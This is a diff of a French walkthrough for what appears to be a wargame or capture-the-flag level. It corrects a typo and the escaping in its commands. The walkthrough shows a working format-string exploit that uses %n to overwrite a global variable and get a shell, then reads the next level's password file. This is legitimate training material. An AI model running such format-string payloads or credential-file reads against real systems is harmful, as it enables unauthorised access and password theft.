@@ -63,7 +63,7 @@ Observons la variable comparée:
 > x/s 0x804988c
 > 0x804988c <m>: ""
 
-On nt voit pas m dans la fonction.
+On ne voit pas m dans la fonction.
 
 Essayons de trouver m dans les globales:
 
@@ -116,11 +116,11 @@ $ python -c 'print "\x8c\x98\x04\x08" + "%x %x %x %x %x"' | ./level3
 
 On va utiliser %n qui va ecrire dans l'adresse le nombre de bytes écrits, 4 bytes dans le cas présent. Il en manque donc 60, on va les rajouter et raccourcir la commande au passage.
 
-$ python -c 'print "\x8c\x98\x04\x08" + "A"\*60 + "%4$n"' | ./level3
+$ python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"' | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 
-$ (python -c 'print "\x8c\x98\x04\x08" + "A"\*60 + "%4$n"'; cat -) | ./level3
+$ (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat -) | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
